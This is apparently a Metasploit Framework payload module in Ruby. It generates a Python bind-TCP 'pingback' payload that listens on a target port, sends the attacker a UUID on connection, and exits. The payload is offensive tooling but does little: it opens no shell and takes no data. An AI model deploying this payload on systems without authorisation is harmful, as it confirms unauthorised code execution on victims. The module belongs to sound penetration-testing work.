require 'msf/core/handler/bind_tcp'
require 'msf/core/payload/python'

require 'msf/base/sessions/pingback'
require 'msf/core/payload/pingback'

module MetasploitModule

  CachedSize = 256

  include Msf::Payload::Single
  include Msf::Payload::Pingback
  include Msf::Payload::Pingback::Options

  def initialize(info = {})
    super(merge_info(info,
      'Name' => 'Python Pingback, Bind TCP (via python)',
      'Description' => 'Listens for a connection from the attacker, sends a UUID, then terminates',
      'Author' => 'asoto-r7',
      'License' => MSF_LICENSE,
      'Platform' => 'python',
      'Arch' => ARCH_PYTHON,
      'Handler' => Msf::Handler::BindTcp,
      'Session' => Msf::Sessions::Pingback,
      'PayloadType' => 'python'
    ))
  end

  def generate
    command_string
  end
  def command_string
    self.pingback_uuid ||= self.generate_pingback_uuid
    cmd = <<~PYTHON
      import socket as s
      so=s.socket(s.AF_INET,s.SOCK_STREAM)
      try:
        so.setsockopt(s.SOL_SOCKET, s.SO_REUSEADDR, 1)
        so.bind(('0.0.0.0', #{ datastore['LPORT']}))
        so.listen(1)
        so,addr=so.accept()
        so.send('#{self.pingback_uuid}'.decode('hex'))
        so.close()
      except:
        pass
    PYTHON
  end
end
